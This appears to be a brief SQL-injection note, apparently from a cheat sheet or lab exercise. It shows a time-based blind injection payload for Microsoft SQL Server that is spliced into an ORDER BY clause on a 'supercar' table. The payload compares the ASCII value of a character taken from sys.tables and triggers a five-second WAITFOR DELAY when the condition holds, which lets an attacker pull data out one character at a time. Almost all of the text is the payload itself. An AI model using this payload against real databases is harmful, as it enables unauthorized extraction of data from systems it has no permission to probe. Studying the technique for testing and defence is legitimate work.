-- check for the first character of the table and delay the respond if the condition is true
select * from supercar order by
'); if (select top 1 ascii(substring([column name], 1, 1)) from sys.tables)<=109 waitfor delay '00:00:05'--
desc
